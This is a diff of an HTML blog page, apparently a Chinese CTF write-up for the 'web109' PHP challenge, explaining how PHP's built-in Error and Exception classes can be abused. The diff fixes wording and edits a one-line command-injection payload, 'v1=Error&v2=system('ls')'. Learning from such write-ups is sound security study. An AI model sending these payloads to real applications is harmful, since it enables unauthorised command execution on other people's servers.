@@ -14,7 +14,7 @@
 <meta property="og:description" content="web10912345678910111213highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&amp;#x27;v1&amp;#x27;]) &amp;&amp; isset($_GET[&amp;#x27;v2&amp;#x27;]))&amp;#123;    $v1 &#x3D; $_GET[&amp;#x27;v1&amp;#x27;];    $v2 &#x3D; $_GET[&amp;#x27;v">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-01-02T15:29:02.000Z">
-<meta property="article:modified_time" content="2024-01-02T15:29:40.866Z">
+<meta property="article:modified_time" content="2024-01-03T12:34:06.837Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
     
@@ -161,9 +161,9 @@
 
 <p>2.php原生类——主要包括报错类、遍历目录类、读取文件类、反射类。</p>
 <p>详细介绍见大佬博客：</p>
-<p>这道题主要用到了报错类：Error、Exception都可，它们都带有__toString()，及输出一个该类的对象时会输出构造函数的参数。</p>
+<p>这道题主要用到了报错类：Error、Exception都可，它们都带有__toString()方法，即输出一个该类的对象时会输出构造函数的参数。</p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=Error&amp;v2=system(ls)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=Error&amp;v2=system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
 
 
 
